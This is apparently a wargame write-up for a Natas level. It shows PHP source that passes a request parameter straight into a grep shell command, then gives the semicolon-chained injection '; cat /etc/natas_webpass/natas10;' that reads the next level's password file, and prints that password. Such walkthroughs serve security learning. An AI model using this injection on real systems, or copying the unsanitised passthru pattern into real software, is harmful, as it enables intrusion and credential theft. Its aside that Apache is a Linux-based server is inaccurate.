## Level8 -> Level9


Here's the source code for the level.


```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

If we enter a character the website prints a match (a character or a word) from the `dictionary.txt` file.


It will print any matching `a` or `A` when entering `a` because it's using `grep -i`(insensitive case) as the command to find all the matches. 


To get the password you can do a clever by-pass by chaining linux commands.


This works because the website uses **[Apache](https://en.wikipedia.org/wiki/Apache_HTTP_Server)** which is a Linux based web-server.


You can chain commands like `;cat /etc/natas_webpass/natas10;`


So now you're executing `grep -i ; cat /etc/nats_webpass/natas10;`


The `;` in linux allows you to run commands right after another, you should add a `;` at the end of `natas10` or else all the other matching words or characters will show up which makes is messy.


If you haven't solved problems by chaining commands with `;` I think it's pretty hard to think of the idea by yourself.



Entering the command `; cat /etc/natas_webpass/natas10;` will give you the password. 


```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```


### 1. What is the passthru function in php? 


To me, it looks really similar to the `system` function in linux or C.


https://www.php.net/manual/en/function.passthru.php

https://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru



### 2. What does $_REQUEST do in php? 


https://www.php.net/manual/en/reserved.variables.request.php

https://stackoverflow.com/questions/29195602/request-in-php 


